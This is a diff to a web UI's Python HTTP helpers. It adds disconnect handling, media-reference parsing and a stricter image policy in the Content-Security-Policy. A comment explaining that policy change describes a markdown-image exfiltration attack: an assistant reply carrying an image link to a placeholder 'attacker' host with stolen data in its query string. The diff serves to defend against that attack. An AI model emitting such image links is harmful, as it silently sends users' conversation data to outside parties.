@@ -3,6 +3,7 @@ Hermes Web UI -- HTTP helper functions.
 """
 import base64 as _base64
 import binascii as _binascii
+import errno
 import functools
 import json as _json
 import logging
@@ -24,6 +25,13 @@ _PUBLIC_MESSAGE_INTERNAL_FIELDS = frozenset({
     "_active_turn_token",
     "_active_turn_user",
     "_fork_child_turn",
+    "_pending_journal_recovery",
+    "_journal_retry_stream_id",
+    "_journal_retry_attempts",
+    "_journal_retry_first_seen_ts",
+    "_journal_retry_kind",
+    "_journal_retry_owner_token",
+    "_journal_retry_process_token",
     "_webui_trusted_agent_input_text",
     "_webui_unmatched_native_image_mirror",
 })
@@ -39,6 +47,52 @@ _CLIENT_DISCONNECT_ERRORS = (
     TimeoutError,
     ssl.SSLError,
 )
+
+
+# A peer that vanishes at the *network* layer (a phone that left the LAN, a
+# Tailscale peer that dropped, an ARP entry that went stale) surfaces on the
+# next write as a bare OSError carrying a routing errno — most commonly
+# EHOSTUNREACH ("No route to host"). Those are not BrokenPipe/Reset, so they
+# escape _CLIENT_DISCONNECT_ERRORS and every long-lived SSE strand ends as a
+# 500 + traceback instead of a clean disconnect.
+#
+# OSError itself stays OUT of the tuple on purpose (too broad — it also covers
+# ENOSPC and file errors, see TestClientDisconnectErrorsTuple), so the
+# narrowing lives here, by errno, and is applied by the SSE write helpers.
+_CLIENT_DISCONNECT_ERRNOS = frozenset({
+    errno.EPIPE,
+    errno.ECONNRESET,
+    errno.ECONNABORTED,
+    errno.EHOSTUNREACH,
+    errno.ENETUNREACH,
+    errno.ENETDOWN,
+    errno.EHOSTDOWN,
+    errno.ENOTCONN,
+    errno.ECONNREFUSED,
+    errno.ETIMEDOUT,
+})
+
+
+def _is_client_disconnect_error(exc: BaseException) -> bool:
+    """True when `exc` means "the client is gone", not "the server is broken".
+
+    Narrow by design: the explicit tuple first, then an errno check for the
+    bare-OSError routing failures the tuple deliberately excludes. Anything
+    else (ENOSPC, EACCES, file errors) returns False and still propagates.
+    """
+    if isinstance(exc, _CLIENT_DISCONNECT_ERRORS):
+        return True
+    return isinstance(exc, OSError) and exc.errno in _CLIENT_DISCONNECT_ERRNOS
+
+
+def _as_client_disconnect(exc: OSError) -> ConnectionResetError:
+    """Rebrand a routing-errno OSError as ConnectionResetError.
+
+    The SSE loops in api/routes.py already read `except
+    _CLIENT_DISCONNECT_ERRORS:`, so converting once here fixes every one of
+    them without touching their catches.
+    """
+    return ConnectionResetError(exc.errno, exc.strerror or 'client disconnected')
 
 
 def require(body: dict, *fields) -> None:
@@ -69,6 +123,68 @@ def safe_resolve(root: Path, requested: str) -> Path:
     return resolved
 
 
+def split_media_token_ref(text: str, match) -> tuple[str, str] | None:
+    """Split a MEDIA regex match into its clean ref and detached prose suffix."""
+    ref = str(match.group(1) or "")
+    suffix = ""
+    before = str(text or "")[: match.start()]
+    for value, forms in (
+        ('"', ('"', "&quot;")),
+        ("'", ("'", "&#39;")),
+    ):
+        if not any(before.endswith(form) for form in forms):
+            continue
+        close_form = ""
+        close_at = -1
+        for form in forms:
+            index = ref.rfind(form)
+            if index > close_at:
+                close_form = form
+                close_at = index
+        if close_at <= 0:
+            continue
+        after_quote = ref[close_at + len(close_form) :]
+        if not _re.fullmatch(r"[.,;:!?]*", after_quote):
+            continue
+        ref = ref[:close_at]
+        suffix = value + after_quote
+        break
+    punctuation_start = len(ref)
+    while punctuation_start and ref[punctuation_start - 1] in ".,;:!?":
+        punctuation_start -= 1
+    trailing_punctuation = ref[punctuation_start:]
+    for delimiter in ("***", "___", "**", "__", "*", "_", "`"):
+        if not before.endswith(delimiter):
+            continue
+        opener_start = len(before) - len(delimiter)
+        if opener_start > 0 and before[opener_start - 1] == delimiter[0]:
+            continue
+        candidate = ref
+        after_delimiter = ""
+        if trailing_punctuation and candidate[: -len(trailing_punctuation)].endswith(delimiter):
+            candidate = candidate[: -len(trailing_punctuation)]
+            after_delimiter = trailing_punctuation
+        if candidate == delimiter:
+            return None
+        if candidate.endswith(delimiter) and len(candidate) > len(delimiter):
+            closer_start = len(candidate) - len(delimiter)
+            if candidate[closer_start - 1] == delimiter[0]:
+                continue
+            ref = candidate[: -len(delimiter)]
+            # The matching closer proves only its own bytes are outside the
+            # reference. Punctuation immediately before it may be a legal
+            # filename or URL byte and must remain bound to the ref.
+            suffix = delimiter + after_delimiter + suffix
+            break
+    # A bare trailing punctuation byte is ambiguous: it may be prose, but it
+    # may also be part of a real local filename or remote URL. Only the quote
+    # and delimiter branches above have evidence from a matching opener that a
+    # closer is outside the MEDIA ref, so preserve every other byte verbatim.
+    if not ref:
+        return None
+    return ref, suffix
+
+
 _CSP_CONNECT_BASE = (
     "'self' http://127.0.0.1:* http://localhost:* http://ipc.localhost "
     "https://127.0.0.1:* https://localhost:* "
@@ -84,6 +200,13 @@ _CSP_EXTRA_CONNECT_RE = _re.compile(
 _CSP_EXTRA_FRAME_RE = _re.compile(
     r"^https?://(?:\*\.)?[A-Za-z0-9._~-]+(?::(?P<port>\d{1,5}|\*))?$"
 )
+# Validator for an opt-in img-src allowlist entry (HERMES_WEBUI_CSP_IMG_EXTRA).
+# Accepts the same http(s) origin shape as the frame-extra validator, PLUS the
+# bare scheme tokens `https:` and `http:` as an explicit opt-out escape hatch
+# for operators who deliberately want to restore wide remote-image loading.
+_CSP_EXTRA_IMG_RE = _re.compile(
+    r"^(?:https?:|https?://(?:\*\.)?[A-Za-z0-9._~-]+(?::(?:\d{1,5}|\*))?)$"
+)
 _CSP_HEADER_NAME = 'Content-Security-Policy'
 _CSP_SHARED_POLICY_TEMPLATE = (
     "default-src 'self' https://*.cloudflareaccess.com; "
@@ -92,7 +215,7 @@ _CSP_SHARED_POLICY_TEMPLATE = (
     "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://static.cloudflareinsights.com blob:; "
     "worker-src blob: 'self' https://cdn.jsdelivr.net; "
     "style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://fonts.googleapis.com; "
-    "img-src 'self' data: https: blob:; "
+    "img-src {img_src}; "
     "font-src 'self' data: https://fonts.gstatic.com; "
     "media-src 'self' data: blob:; "
     "connect-src {connect_src}; "
@@ -100,6 +223,16 @@ _CSP_SHARED_POLICY_TEMPLATE = (
     "manifest-src 'self' https://*.cloudflareaccess.com; "
     "base-uri 'self'; form-action 'self'"
 )
+# Base img-src: same-origin files, inline data: URIs (how the renderer embeds
+# generated/pasted images), and blob: — but NOT bare `https:`. A remote
+# `![alt](https://attacker/?data=…)` in an assistant reply renders as a live
+# <img> and the browser beacons to that origin on render with no tool call or
+# approval — the markdown-image exfiltration class (EchoLeak, #7941). The WebUI
+# loads no remote images of its own (CDN assets are scripts/styles, governed by
+# script-src/style-src), so default-deny here only blocks the exfil vector.
+# Operators who need remote images can allowlist specific hosts (or re-add the
+# bare `https:` scheme) via HERMES_WEBUI_CSP_IMG_EXTRA.
+_CSP_IMG_BASE = "'self' data: blob:"
 # Base frame-src: same-origin only by default (so the existing same-origin
 # dashboard/extension iframes keep working). An operator can widen it, opt-in,
 # via HERMES_WEBUI_CSP_FRAME_EXTRA — e.g. to embed a self-hosted dashboard in an
@@ -156,6 +289,48 @@ def _csp_extra_frame_src() -> str:
     return " " + " ".join(sources)
 
 
+def _valid_csp_extra_img_source(source: str) -> bool:
+    # Bare scheme tokens are an explicit opt-out escape hatch (restore wide
+    # remote images). The regex already validates port range via \d{1,5}, but
+    # re-check it here for the origin form to reject e.g. :99999.
+    if source in ("https:", "http:"):
+        return True
+    match = _CSP_EXTRA_IMG_RE.fullmatch(source)
+    if not match:
+        return False
+    # Extract a trailing :port (not the scheme colon) and range-check it.
+    tail = source.rsplit(":", 1)[-1]
+    if tail.isdigit():
+        try:
+            return 1 <= int(tail) <= 65535
+        except ValueError:
+            return False
+    return True
+
+
+def _csp_extra_img_src() -> str:
+    raw = os.getenv("HERMES_WEBUI_CSP_IMG_EXTRA", "").strip()
+    if not raw:
+        return ""
+    sources = raw.split()
+    if not sources or any(not _valid_csp_extra_img_source(src) for src in sources):
+        logger.warning("Ignoring invalid HERMES_WEBUI_CSP_IMG_EXTRA value")
+        return ""
+    return " " + " ".join(sources)
+
+
+def csp_img_extra_sources(extra_img_src: str | None = None) -> list[str]:
+    """Validated HERMES_WEBUI_CSP_IMG_EXTRA entries as a list, for the page config.
+
+    The renderer mirrors this list so a remote image outside the allowlist is
+    shown as an inert click-to-open link rather than a blocked <img>. Pass the
+    value already computed for the response's CSP header so the page and the
+    header always agree; ``None`` reads (and validates) the environment.
+    """
+    value = _csp_extra_img_src() if extra_img_src is None else extra_img_src
+    return value.split()
+
+
 def _csp_connect_src(extra_connect_src: str = "") -> str:
     return f"{_CSP_CONNECT_BASE} https://cdn.jsdelivr.net{extra_connect_src}"
 
@@ -164,26 +339,35 @@ def _csp_frame_src(extra_frame_src: str = "") -> str:
     return f"{_CSP_FRAME_BASE}{extra_frame_src}"
 
 
+def _csp_img_src(extra_img_src: str = "") -> str:
+    return f"{_CSP_IMG_BASE}{extra_img_src}"
+
+
 def _build_csp_enforced_policy(
     extra_connect_src: str | None = None,
     extra_frame_src: str | None = None,
+    extra_img_src: str | None = None,
 ) -> str:
     if extra_connect_src is None:
         extra_connect_src = _csp_extra_connect_src()
     if extra_frame_src is None:
         extra_frame_src = _csp_extra_frame_src()
+    if extra_img_src is None:
+        extra_img_src = _csp_extra_img_src()
     return _CSP_SHARED_POLICY_TEMPLATE.format(
         connect_src=_csp_connect_src(extra_connect_src),
         frame_src=_csp_frame_src(extra_frame_src),
+        img_src=_csp_img_src(extra_img_src),
     )
 
 
 def _build_csp_report_only_policy(
     extra_connect_src: str | None = None,
     extra_frame_src: str | None = None,
+    extra_img_src: str | None = None,
 ) -> str:
     return (
-        _build_csp_enforced_policy(extra_connect_src, extra_frame_src)
+        _build_csp_enforced_policy(extra_connect_src, extra_frame_src, extra_img_src)
         + "; report-uri /api/csp-report; report-to csp-endpoint"
     )
 
@@ -192,12 +376,25 @@ def _security_headers(handler):
     """Add security headers to every response."""
     extra_connect_src = _csp_extra_connect_src()
     extra_frame_src = _csp_extra_frame_src()
+    # A route that already embedded the image allowlist in its body (the app
+    # shell's window.__HERMES_CONFIG__.imgSrcExtra) pre-sets this attribute so
+    # the header and the page agree for this response; otherwise read it here.
+    # Consume it: with keep-alive one handler instance serves several requests,
+    # and a later response on the same connection must read its own value.
+    preset_img_src = getattr(handler, "_csp_extra_img_src_preset", None)
+    if preset_img_src is not None:
+        try:
+            delattr(handler, "_csp_extra_img_src_preset")
+        except AttributeError:
+            pass
+    extra_img_src = preset_img_src if isinstance(preset_img_src, str) else _csp_extra_img_src()
     handler._csp_extra_connect_src = extra_connect_src
     handler._csp_extra_frame_src = extra_frame_src
+    handler._csp_extra_img_src = extra_img_src
     handler.send_header('X-Content-Type-Options', 'nosniff')
     handler.send_header('X-Frame-Options', 'DENY')
     handler.send_header('Referrer-Policy', 'same-origin')
-    handler.send_header(_CSP_HEADER_NAME, _build_csp_enforced_policy(extra_connect_src, extra_frame_src))
+    handler.send_header(_CSP_HEADER_NAME, _build_csp_enforced_policy(extra_connect_src, extra_frame_src, extra_img_src))
     handler.send_header(
         'Permissions-Policy',
         'camera=(), microphone=(self), geolocation=(), clipboard-write=(self)'
@@ -491,9 +688,14 @@ def _json_response_body(payload, *, pretty: bool = True) -> bytes:
     the public helper default stable for existing tests/callers; hot paths can
     opt into compact JSON with ``pretty=False``.
     """
-    if pretty:
-        return _json.dumps(payload, ensure_ascii=False, indent=2).encode('utf-8')
-    return _json.dumps(payload, ensure_ascii=False, separators=(',', ':')).encode('utf-8')
+    formatting = {'indent': 2} if pretty else {'separators': (',', ':')}
+    body = _json.dumps(payload, ensure_ascii=False, **formatting)
+    try:
+        return body.encode('utf-8')
+    except UnicodeEncodeError:
+        # Recovery preserves provider surrogate halves losslessly. Keep the
+        # same payload/format while making its JSON safe for UTF-8 transport.
+        return _json.dumps(payload, ensure_ascii=True, **formatting).encode('utf-8')
 
 
 def j(handler, payload, status: int=200, extra_headers: dict=None, *, pretty: bool = True) -> None:
@@ -637,6 +839,9 @@ def _build_redact_fn():
     def _restore_code_env_key_literals(original: str, redacted: str) -> str:
         if not isinstance(original, str) or not isinstance(redacted, str):
             return redacted
+        # Both assignment-prefix patterns require '=' in the original text.
+        if "=" not in original:
+            return redacted
         literal_occurrences: dict[tuple[str, int], str] = {}
         original_counts: dict[str, int] = {}
         for match in _ENV_KEY_PREFIX_RE.finditer(original):
@@ -675,7 +880,9 @@ def _build_redact_fn():
         text = _CRED_RE.sub(lambda m: _mask(m.group(1)), text)
         text = _EMBEDDED_AWS_ACCESS_KEY_RE.sub(lambda m: _mask(m.group(0)), text)
         text = _AUTH_HDR_RE.sub(lambda m: m.group(1) + _mask(m.group(2)), text)
-        text = _ENV_RE.sub(_env_replacement, text)
+        # Earlier passes may remove delimiters; test the text actually scanned.
+        if "=" in text:
+            text = _ENV_RE.sub(_env_replacement, text)
         text = _PRIVKEY_RE.sub("[REDACTED PRIVATE KEY]", text)
         return text
 
@@ -1734,18 +1941,12 @@ def get_profile_cookie(handler) -> str | None:
     impersonate another profile. In no-auth deployments, keep the historical
     plain profile-name cookie behavior.
     """
-    cookie_header = handler.headers.get('Cookie', '')
-    if not cookie_header:
-        return None
-    import http.cookies as _hc
-    cookie = _hc.SimpleCookie()
-    try:
-        cookie.load(cookie_header)
-    except _hc.CookieError:
-        return None
-    cookie_name = get_profile_cookie_name()
-    morsel = cookie.get(cookie_name)
-    if not (morsel and morsel.value):
+    # Same tolerant read as the auth cookie: a foreign cookie on a shared host/domain must
+    # not hide this one, or a profile switch silently does not stick (see read_cookie).
+    from api.auth import read_cookie
+
+    raw_val = read_cookie(handler, get_profile_cookie_name())
+    if not raw_val:
         return None
 
     from api.profiles import _PROFILE_ID_RE
@@ -1753,7 +1954,6 @@ def get_profile_cookie(handler) -> str | None:
     def _valid_profile_name(val: str) -> bool:
         return val == 'default' or bool(_PROFILE_ID_RE.fullmatch(val))
 
-    raw_val = morsel.value
     try:
         from api.auth import is_auth_enabled, parse_cookie, verify_profile_cookie_value
         if is_auth_enabled():
